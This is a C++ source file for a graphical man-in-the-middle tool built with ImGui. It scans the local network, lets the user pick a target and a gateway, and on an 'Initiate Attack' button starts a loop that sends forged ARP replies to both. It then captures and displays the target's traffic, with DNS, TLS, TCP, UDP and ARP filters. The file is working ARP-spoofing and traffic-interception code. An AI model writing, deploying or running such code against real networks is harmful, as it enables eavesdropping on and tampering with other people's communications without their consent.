#include "Client.h"
#include "imgui/imgui.h"
#include <WS2spi.h>
#include <thread>
#include <mutex>

#define CHECK_TO_BLINK_ELEMENT (fmodf((float)ImGui::GetTime(), 0.80f) < 0.34f)
#define INTERCEPTED_PACKET_BUFFER_SIZE 200

typedef std::shared_ptr<GenericPacket> GenericPacketRef;

struct PacketNode
{
	PacketHeader header;
	GenericPacketRef packet_ref;
	uint64_t packet_id = 0;
};

static std::vector<PacketNode> s_intercepted_packets;
static std::mutex s_packet_interception_mutex;
static std::mutex s_filter_options_mutex;

void ClientApplication::init()
{
	m_selected_packet = std::make_shared<GenericPacket>();

	set_dark_theme_colors();
	s_intercepted_packets.clear();

	m_adapter_list.find_adapters();

	m_vendor_decoder.load_vendor_list();
}

void ClientApplication::render()
{
	// Create dockspace
	ImGui::DockSpaceOverViewport(ImGui::GetMainViewport());

	// If there is no selected adapter, render
	// the adapter list so the user can select
	// their desired adapter.
	if (!m_selected_adapter.is_online)
	{
		render_adapters_list();
		return;
	}

	// At this point, a specific adapter has been selected.
	// First, render the local network info and MITM attack data.
	render_mitm_attack_data();

	// If the user needs to select the target,
	// display the target selection window.
	if (m_display_select_target_window)
	{
		ImGui::OpenPopup(m_select_target_window_id);
		m_display_select_target_window = false;
	}
	render_target_selection_window();

	// If the user needs to select the gateway,
	// display the target selection window.
	if (m_display_select_gateway_window)
	{
		ImGui::OpenPopup(m_select_gateway_window_id);
		m_display_select_gateway_window = false;
	}
	render_gateway_selection_window();

	// Render the intercepted traffic window
	render_intercepted_traffic_window();

	// Render filtering options
	render_packet_filters_window();

	// Render packet inspection window
	render_packet_inspection_window();
}

void ClientApplication::set_dark_theme_colors()
{
	auto& colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_WindowBg] = ImVec4{ 0.1f, 0.105f, 0.11f, 1.0f };

	// Headers
	colors[ImGuiCol_Header] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_HeaderHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_HeaderActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Buttons
	colors[ImGuiCol_Button] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_ButtonHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_ButtonActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Frame BG
	colors[ImGuiCol_FrameBg] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_FrameBgHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_FrameBgActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Tabs
	colors[ImGuiCol_Tab] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TabHovered] = ImVec4{ 0.38f, 0.3805f, 0.381f, 1.0f };
	colors[ImGuiCol_TabActive] = ImVec4{ 0.28f, 0.2805f, 0.281f, 1.0f };
	colors[ImGuiCol_TabUnfocused] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };

	// Title
	colors[ImGuiCol_TitleBg] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TitleBgActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
}

void ClientApplication::render_adapters_list()
{
	auto window_height = 100 + m_adapter_list.adapters.size() * 60;
	ImGui::SetNextWindowSize(ImVec2(500, (float)window_height));
	ImGui::Begin("Select Adapter", nullptr, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoCollapse);

    auto& io = ImGui::GetIO();

    ImGui::Text("Found Adapters: %zi", m_adapter_list.adapters.size());
    ImGui::Separator();

	for (auto& adapter : m_adapter_list.adapters)
	{
		if (ImGui::TreeNode(adapter.description.c_str()))
		{
			constexpr float indent_w = 16.0f;

			ImGui::Spacing();
			ImGui::Indent(indent_w);

			ImGui::Text("ID: %s", adapter.name.c_str());
			ImGui::Text("Address: %s", adapter.address.to_string().c_str());
			ImGui::Text("Netmask: %s", adapter.netmask.to_string().c_str());
			ImGui::Text("Broadcast: %s", adapter.broadcast.to_string().c_str());

			bool b_selected = ImGui::Button("Select");
			if (b_selected)
			{
				// Set the selected adapter
				m_selected_adapter = adapter;
				net_utils::set_adapter(m_selected_adapter);

				// Retrieve the local MAC address
				net_utils::retrieve_local_mac_address(m_mitm_data.local_mac_address);

				// Set the IPv4 field in MITM data structure
				m_mitm_data.local_ip = adapter.address.to_string();
			}

			ImGui::TreePop();
			ImGui::Spacing();
			ImGui::Separator();
			ImGui::Unindent(indent_w);
		}
		ImGui::Spacing();
	}

	ImGui::End();
}

void ClientApplication::render_mitm_attack_data()
{
	ImGui::SetNextWindowSize(ImVec2(300, 240));
	ImGui::Begin("MITM Data", nullptr, ImGuiWindowFlags_AlwaysAutoResize);

	// Display Local Data
	ImGui::SetNextItemOpen(m_mitm_local_data_opened_flag);
	m_mitm_local_data_opened_flag = ImGui::TreeNode("Local Info");
	if (m_mitm_local_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
			m_mitm_data.local_mac_address[0],
			m_mitm_data.local_mac_address[1],
			m_mitm_data.local_mac_address[2],
			m_mitm_data.local_mac_address[3],
			m_mitm_data.local_mac_address[4],
			m_mitm_data.local_mac_address[5]
		);

		ImGui::Text("IPv4: %s", m_mitm_data.local_ip.c_str());

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	ImGui::Separator();

	// Display Target Data
	ImGui::SetNextItemOpen(m_mitm_target_data_opened_flag);
	m_mitm_target_data_opened_flag = ImGui::TreeNode("Target");
	if (m_mitm_target_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_mitm_data.target_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_mitm_data.target_mac_address[0],
				m_mitm_data.target_mac_address[1],
				m_mitm_data.target_mac_address[2],
				m_mitm_data.target_mac_address[3],
				m_mitm_data.target_mac_address[4],
				m_mitm_data.target_mac_address[5]
			);

			ImGui::Text("IPv4: %s", m_mitm_data.target_ip.c_str());
			ImGui::Text((!m_mitm_data.attack_in_progress) ? "ARP Table: Real" : "ARP Table: Spoofed");
		}
		else
		{
			ImGui::Text("Target not selected");
			ImGui::SameLine();
		}

		if (!m_mitm_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select");
			if (select_clicked)
			{
				m_display_select_target_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	ImGui::Separator();

	// Display Gateway Data
	ImGui::SetNextItemOpen(m_mitm_gateway_data_opened_flag);
	m_mitm_gateway_data_opened_flag = ImGui::TreeNode("Gateway");
	if (m_mitm_gateway_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_mitm_data.gateway_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_mitm_data.gateway_mac_address[0],
				m_mitm_data.gateway_mac_address[1],
				m_mitm_data.gateway_mac_address[2],
				m_mitm_data.gateway_mac_address[3],
				m_mitm_data.gateway_mac_address[4],
				m_mitm_data.gateway_mac_address[5]
			);

			ImGui::Text("IPv4: %s", m_mitm_data.gateway_ip.c_str());
			ImGui::Text((!m_mitm_data.attack_in_progress) ? "ARP Table: Real" : "ARP Table: Spoofed");
		}
		else
		{
			ImGui::Text("Gateway not selected");
			ImGui::SameLine();
		}

		if (!m_mitm_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select");
			if (select_clicked)
			{
				m_display_select_gateway_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	
	if (!m_mitm_data.target_ip.empty() &&
		!m_mitm_data.gateway_ip.empty())
	{
		ImGui::Separator();
		for (size_t i = 0; i < 5; ++i) { ImGui::Spacing(); }

		ImGui::SetCursorPosX(ImGui::GetWindowSize().x / 2.0f - 55.0f);
		
		if (!m_mitm_data.attack_in_progress)
		{
			if (ImGui::Button("Initiate Attack", ImVec2(110, 25)))
			{
				m_mitm_data.attack_in_progress = true;
				start_arp_spoofing_loop();
				start_traffic_interception_loop();
			}
		}
		else
		{

			if (!m_mitm_data.rearping_in_progress)
			{
				if (ImGui::Button("Stop Attack", ImVec2(110, 25)))
				{
					s_intercepted_packets.clear();
					stop_attack_and_restore_arp_tables();
				}
			}
			else if (CHECK_TO_BLINK_ELEMENT)
			{
				ImGui::Text("Re-Arping Targets...");
			}
		}
	}

	ImGui::End();
}

void ClientApplication::render_target_selection_window()
{
	render_generic_host_selection_window(m_select_target_window_id, m_mitm_data.target_ip, m_mitm_data.target_mac_address);
}

void ClientApplication::render_gateway_selection_window()
{
	render_generic_host_selection_window(m_select_gateway_window_id, m_mitm_data.gateway_ip, m_mitm_data.gateway_mac_address);
}

void ClientApplication::render_generic_host_selection_window(const char* popup_target_id, std::string& ip_buffer, macaddr mac_buffer)
{
	const float IPV4_CURSOR_POS_X		= 8.0f;
	const float MAC_CURSOR_POS_X		= 190.0f;
	const float VENDOR_CURSOR_POS_X		= 400.0f;

	ImGui::SetNextWindowSizeConstraints(ImVec2(500, 500), ImVec2(700, 500));
	if (ImGui::BeginPopupModal(popup_target_id, &m_is_host_selection_window_opened, ImGuiWindowFlags_AlwaysAutoResize))
	{
		ImGui::Text("Hosts Found: %zi", network_scanner::s_network_scan_map.size());
		ImGui::SameLine();
		ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 120);

		if (!m_scanning_network)
		{
			if (ImGui::Button("Scan network"))
			{
				m_scanning_network = true;

				std::thread scanning_thread([this]() {
					auto local_ip = m_mitm_data.local_ip;
					auto ip_prefix = local_ip.substr(0, local_ip.rfind(".") + 1);
					network_scanner::scan_network(m_mitm_data.local_mac_address, local_ip, ip_prefix, &m_vendor_decoder);

					m_scanning_network = false;
				});
				scanning_thread.detach();
			}
		}
		else
		{
			ImGui::Text("Scanning...");
		}

		ImGui::Spacing();
		ImGui::Separator();
		ImGui::Spacing();

		ImGui::SetCursorPosX(IPV4_CURSOR_POS_X);
		ImGui::Text("IPv4");
		ImGui::SameLine();
		ImGui::SetCursorPosX(MAC_CURSOR_POS_X);
		ImGui::Text("MAC");
		ImGui::SameLine();
		ImGui::SetCursorPosX(VENDOR_CURSOR_POS_X);
		ImGui::Text("Vendor");

		ImGui::Spacing();
		ImGui::Separator();
		ImGui::Spacing();

		// Create a copy of the scan map to avoid
		// iteration issues during multithreaded scanning.
		std::map<std::string, network_scanner::netscan_node> scan_map_copy = network_scanner::s_network_scan_map;

		for (auto& [ip, node] : scan_map_copy)
		{
			if (ImGui::Selectable(("##host" + ip).c_str()))
			{
				ip_buffer = ip.c_str();
				memcpy(mac_buffer, node.physical_address, sizeof(macaddr));
			}

			ImGui::SameLine();
			ImGui::SetCursorPosX(IPV4_CURSOR_POS_X);
			ImGui::Text("%s", ip.c_str());

			ImGui::SameLine();
			ImGui::SetCursorPosX(MAC_CURSOR_POS_X);
			ImGui::Text("%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				node.physical_address[0],
				node.physical_address[1],
				node.physical_address[2],
				node.physical_address[3],
				node.physical_address[4],
				node.physical_address[5]
			);

			ImGui::SameLine();
			ImGui::SetCursorPosX(VENDOR_CURSOR_POS_X);
			ImGui::Text("%s", node.vendor.c_str());

			ImGui::Spacing();
		}

		ImGui::EndPopup();
	}
}

void ClientApplication::render_intercepted_traffic_window()
{
	ImGui::SetNextWindowSize(ImVec2(500, 400));
	ImGui::Begin("Intercepted Traffic");

	if (!m_mitm_data.attack_in_progress || m_mitm_data.rearping_in_progress)
	{
		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
		ImGui::SetCursorPos(ImVec2(middle_x, middle_y));
		ImGui::Text("No Attack Detected");
	}
	else
	{
		for (size_t i = 0; i < s_intercepted_packets.size(); ++i)
		{
			auto& node = s_intercepted_packets.at(i);
			auto& header = node.header;
			auto& packet_ref = node.packet_ref;

			// Skip over faulty packets
			if (!packet_ref)
				continue;

			EthHeader* eth_header = get_eth_header(packet_ref->buffer);

			// Check if the packet was originated from the target host
			bool target_is_sender = memcmp(eth_header->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			if (!target_is_sender)
				continue;

			if (PacketFilterManager::filter_packet(packet_ref->buffer, &m_filter_options))
			{
				std::string selectable_id = "##selectable_packet" + std::to_string(i);
				ImGui::Selectable(selectable_id.c_str(), node.packet_id == m_selected_packet_id);
				if (ImGui::IsItemHovered())
				{
					// If the packet is double clicked, open
					// a new window to inspect it with.                                                                                                                                                                                                                        
					if (ImGui::IsMouseDoubleClicked(0))
					{
						m_selected_packet_id = node.packet_id;
						memcpy(m_selected_packet->buffer, packet_ref->buffer, header.len);
					}
					else if (ImGui::IsMouseClicked(0))
					{
						m_selected_packet_id = node.packet_id;
						memcpy(m_selected_packet->buffer, packet_ref->buffer, header.len);
					}
				}

				ImGui::SameLine();
				MainPacketRenderer::render_packet_selection_header(packet_ref->buffer, &m_filter_options);
			}
		}
	}

	ImGui::End();
}

void ClientApplication::render_packet_filters_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(500, 100), ImVec2(1200, 120));
	ImGui::Begin("Packet Filters");

	ImGui::SetCursorPos(ImVec2(40.0f, ImGui::GetWindowHeight() / 2.0f));
	ImGui::Checkbox("DNS", &m_filter_options.dns_filter);
	
	ImGui::SameLine(); ImGui::SetCursorPosX(120.0f);
	ImGui::Checkbox("TLS", &m_filter_options.tls_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(200.0f);
	ImGui::Checkbox("TCP", &m_filter_options.tcp_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(280.0f);
	ImGui::Checkbox("UDP", &m_filter_options.udp_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(360.0f);
	ImGui::Checkbox("ARP", &m_filter_options.arp_filter);
	
	ImGui::End();
}

void ClientApplication::render_packet_inspection_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(300, 200), ImVec2(1800, 1000));
	ImGui::Begin("Packet Inspection");

	if (m_selected_packet_id == 0)
	{
		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
		ImGui::SetCursorPos(ImVec2(middle_x, middle_y));
		ImGui::Text("No Packet Selected");
	}
	else
	{
		MainPacketRenderer::render_packet_inspection_tree(m_selected_packet->buffer);
	}

	ImGui::End();
}

void ClientApplication::start_arp_spoofing_loop()
{
	std::thread spoofing_thread([this]() {
		ArpPacket target_packet;
		craft_arp_reply_packet(
			&target_packet,
			m_mitm_data.local_mac_address,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_ip.c_str(),
			m_mitm_data.target_ip.c_str()
		);

		ArpPacket gateway_packet;
		craft_arp_reply_packet(
			&gateway_packet,
			m_mitm_data.local_mac_address,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_ip.c_str(),
			m_mitm_data.gateway_ip.c_str()
		);

		while (m_mitm_data.attack_in_progress &&
			   !m_mitm_data.rearping_in_progress)
		{
			net_utils::send_packet(&target_packet, sizeof(ArpPacket));
			net_utils::send_packet(&gateway_packet, sizeof(ArpPacket));
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	});
	spoofing_thread.detach();
}

void ClientApplication::stop_attack_and_restore_arp_tables()
{
	std::thread rearp_thread([this]() {
		m_mitm_data.rearping_in_progress = true;
		std::this_thread::sleep_for(std::chrono::seconds(1));

		ArpPacket target_restore_packet;
		craft_arp_reply_packet(
			&target_restore_packet,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_ip.c_str(),
			m_mitm_data.target_ip.c_str()
		);

		ArpPacket gateway_restore_packet;
		craft_arp_reply_packet(
			&gateway_restore_packet,
			m_mitm_data.target_mac_address,
			m_mitm_data.gateway_mac_address,
			m_mitm_data.target_ip.c_str(),
			m_mitm_data.gateway_ip.c_str()
		);

		for (size_t i = 0; i < 20; i++)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			net_utils::send_packet(&target_restore_packet, sizeof(ArpPacket));
		}
		for (size_t i = 0; i < 20; i++)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
			net_utils::send_packet(&gateway_restore_packet, sizeof(ArpPacket));
		}

		m_mitm_data.attack_in_progress = false;
		m_mitm_data.rearping_in_progress = false;
	});
	rearp_thread.detach();
}

void ClientApplication::start_traffic_interception_loop()
{
	std::thread interception_thread([this]() {
		while (m_mitm_data.attack_in_progress &&
			!m_mitm_data.rearping_in_progress)
		{
			auto packet = std::make_shared<GenericPacket>();
			PacketHeader header;

			net_utils::recv_packet(&header, packet->buffer, MAX_PACKET_SIZE);

			EthHeader* eth_header = get_eth_header(packet->buffer);

			// Check if the packet was originated from the target host
			bool target_is_sender = memcmp(eth_header->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			// Check if the target host is the destination of the packet
			bool target_is_destination = memcmp(eth_header->dest, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			// If packet is not from the gateway to the target
			// or from target to gateway, skip the packet.
			if (!target_is_sender && !target_is_destination)
				continue;

			// Checking if packet passes any of the filters
			if (!PacketFilterManager::filter_packet(packet->buffer, &m_filter_options))
				continue;

			// Lock the mutex
			s_packet_interception_mutex.lock();

			// Check if packet node buffer needs to be partially freed up
			if (s_intercepted_packets.size() > INTERCEPTED_PACKET_BUFFER_SIZE)
				s_intercepted_packets.resize(s_intercepted_packets.size() - (INTERCEPTED_PACKET_BUFFER_SIZE / 4));

			// Increment the new packet ID
			static uint64_t s_new_packet_id = 0;
			++s_new_packet_id;

			if (s_new_packet_id == 0) // handle unsigned int overflows
				s_new_packet_id = 1;

			// Insert the new packet node
			PacketNode node;
			node.header = header;
			node.packet_ref = std::make_shared<GenericPacket>();
			memcpy(node.packet_ref->buffer, packet->buffer, MAX_PACKET_SIZE);
			node.packet_id = s_new_packet_id;

			s_intercepted_packets.insert(s_intercepted_packets.begin(), node);

			// Unlock the mutex
			s_packet_interception_mutex.unlock();
		}
	});
	interception_thread.detach();
}
